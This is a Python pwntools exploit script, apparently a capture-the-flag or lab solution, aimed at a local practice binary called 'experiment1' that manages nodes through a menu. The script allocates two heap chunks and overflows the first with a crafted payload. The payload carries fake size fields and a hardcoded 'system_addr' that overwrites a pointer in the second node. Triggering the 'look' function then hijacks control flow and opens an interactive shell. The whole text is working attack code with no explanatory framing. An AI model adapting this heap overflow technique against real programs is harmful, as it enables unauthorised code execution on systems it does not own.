from pwn import *
p = process('./experiment1')
system_addr = 0x400A12
#context.log_level = 'debug'
def add(length):
	p.sendline('1')
	p.recvuntil("length\n")
	p.sendline(str(length))
	p.recvuntil('deletenode\n')
def write(index,content):
	p.sendline('2')
	p.recvuntil("node\n")	
	p.sendline(str(index))
	p.recvuntil("content\n")
	p.sendline(content)
	p.recvuntil('deletenode\n')
def look(index):
	p.sendline('3')
	p.recvuntil("node\n")	
	p.sendline(str(index))
	p.recvuntil('deletenode\n')
def delete(index):
	p.sendline('4')
	p.recvuntil("node\n")	
	p.sendline(str(index))
	p.recvuntil('deletenode\n')

add(0x50)
add(0x50)
#write(0,'1123')
write(0,p64(1)*5+p64(0x41)+p64(0x41)+p64(system_addr))
p.sendline('3')
p.recvuntil("node\n")
p.sendline(str(1))
p.interactive()	




